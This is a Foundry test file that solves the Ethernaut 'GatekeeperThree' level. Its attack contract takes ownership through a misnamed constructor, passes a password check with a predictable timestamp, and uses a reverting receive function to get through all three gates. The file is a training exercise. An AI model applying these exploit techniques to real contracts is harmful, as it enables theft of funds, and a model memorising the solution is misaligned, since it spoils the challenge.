// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {GatekeeperThree, GatekeeperThreeFactory} from "ethernaut/levels/GatekeeperThreeFactory.sol";

contract GatekeeperThreeLevel is SetUpLevelTest {
    GatekeeperThree internal gatekeeperThree;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0.01 ether;
        level = address(new GatekeeperThreeFactory());
        super.setUp();
        gatekeeperThree = GatekeeperThree(payable(instance));

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player, player);
        GateAttackThree gateAttack = new GateAttackThree();
        gateAttack.open{value: 0.01 ether}(address(gatekeeperThree));
        vm.stopPrank();
    }
}

contract GateAttackThree {
    function open(address _target) public payable {
        GatekeeperThree gateThree = GatekeeperThree(payable(_target));
        gateThree.construct0r();
        gateThree.createTrick();
        gateThree.getAllowance(block.timestamp);
        (bool success, ) = address(gateThree).call{value: msg.value}("");
        assert(success);
        gateThree.enter();
    }

    receive() external payable {
        revert();
    }
}
